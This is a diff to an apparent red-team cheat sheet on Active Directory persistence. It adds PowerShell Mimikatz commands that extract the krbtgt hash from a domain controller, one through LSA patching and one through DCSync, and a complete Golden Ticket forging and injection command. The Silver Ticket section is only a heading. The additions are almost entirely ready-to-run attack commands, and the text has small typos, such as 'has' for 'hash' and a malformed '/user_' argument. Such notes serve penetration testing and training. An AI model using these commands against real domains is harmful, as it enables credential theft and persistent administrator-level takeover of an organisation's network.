@@ -1,7 +1,17 @@
 ## Persistence on Active Directory 
 
-### Golden Ticket
+### Get `krbtgt` has
+```powershell
+# On DC as a DA
+C:> Invoke-Mimikatz -Command '"lsadump:lsa /patch"'
 
+# DC-Sync attack
+C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user_<domain>\krbtgt"'
+```
+### Golden Ticket
+```powershell
+C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+```
 
 
 ### Silver Ticket
